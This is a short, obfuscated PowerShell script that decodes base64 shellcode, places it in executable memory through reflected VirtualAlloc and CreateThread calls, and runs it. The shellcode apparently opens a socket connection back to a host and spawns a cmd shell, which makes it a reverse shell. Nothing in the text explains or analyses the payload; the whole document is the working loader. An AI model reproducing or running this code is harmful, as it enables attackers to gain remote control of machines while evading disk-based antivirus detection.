function t3z {
	Param ($hmOqZ0, $kITz4Y0M)		
	$sFyq = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $sFyq.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($sFyq.GetMethod('GetModuleHandle')).Invoke($null, @($hmOqZ0)))), $kITz4Y0M))
}

function oKlZDAvp {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $wYfpRtvcrL9,
		[Parameter(Position = 1)] [Type] $fne298db = [Void]
	)
	
	$qO0yFRQHyw_r = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$qO0yFRQHyw_r.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $wYfpRtvcrL9).SetImplementationFlags('Runtime, Managed')
	$qO0yFRQHyw_r.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $fne298db, $wYfpRtvcrL9).SetImplementationFlags('Runtime, Managed')
	
	return $qO0yFRQHyw_r.CreateType()
}

[Byte[]]$waRmNDu = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VUFBQUEBQQFBo6g/f4P/Vl2oFaH8AAAFoAgD//4nmahBWV2iZpXRh/9WFwHQM/04Idexo8LWiVv/VaGNtZACJ41dXVzH2ahJZVuL9ZsdEJDwBAY1EJBDGAERUUFZWVkZWTlZWU1Zoecw/hv/VieBOVkb/MGgIhx1g/9W78LWiVmimlb2d/9U8BnwKgPvgdQW7RxNyb2oAU//V")
		
$dbPIQe = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((t3z kernel32.dll VirtualAlloc), (oKlZDAvp @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $waRmNDu.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($waRmNDu, 0, $dbPIQe, $waRmNDu.length)

$xuWnqK = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((t3z kernel32.dll CreateThread), (oKlZDAvp @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$dbPIQe,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((t3z kernel32.dll WaitForSingleObject), (oKlZDAvp @([IntPtr], [Int32]))).Invoke($xuWnqK,0xffffffff) | Out-Null